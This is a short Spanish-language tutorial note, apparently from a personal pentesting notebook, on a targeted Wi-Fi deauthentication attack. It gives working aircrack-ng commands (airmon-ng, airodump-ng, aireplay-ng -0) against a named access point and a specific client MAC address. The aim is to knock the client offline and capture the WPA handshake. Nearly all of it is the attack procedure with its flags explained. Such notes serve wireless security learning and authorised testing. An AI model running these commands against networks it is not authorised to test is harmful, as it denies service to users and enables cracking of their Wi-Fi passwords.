# DesAuth Dirigido 
Consiste en interceptar una comunicacion del cliente al AP, insertando en la data paquetes de desautenticacion, con el objetivo de denegar el servicio al cliente.

	airmon-ng start wlan1
Iniciamos nuestra tarjeta de red en modo monitor.

	airodump-ng wlan1mon -c 1
Monitoriamos la red en el canal 1

**Datos del AP**
D0:B6:6F:5A:4C:BF  INFINITUM33B5      
**Datos del cliente asociado al AP**
74:23:44:A9:C7:67 

	airodump-ng -c 1 -w CapturasDeAuth --essid INFINITUM33B5 wlan1mon 
Capturamos los paquetes que circulan en la AP

-w *archivo donde se guardaran las capturas de la red.*
-c 1 *especificamos el canal donde se ubica el AP.*
 --essid *nombre de la red victima.*
 wlan1mon *interfaz de red con la cual deseamos escaner el trafico de la red victima.*

Mientras realizamos la captura del trafico vamos a enviar paquetes  DeAuth a un cliente en espesifico para capturar el [[HandShake]].

	aireplay-ng -0 10 -e INFINITUM33B5 -c 74:23:44:A9:C7:67 wlan1mon
Mandamos paquetes DeAuth para expulsar al cliente y que se vuelva a conectar para capturar el HandShake.

-0 *especificamos que se realizara un ataque DeAuth.*
10 *numero de paquetes DeAuth que enviaremos.*
-e *essid de la red.*
-c *direccion mac del cliente que expulsaremos de la red.*
wlan1mon *tarjeta de la red en modo monitor.*

Una vez que el cliente se reconecte abremos capturado el HandShake.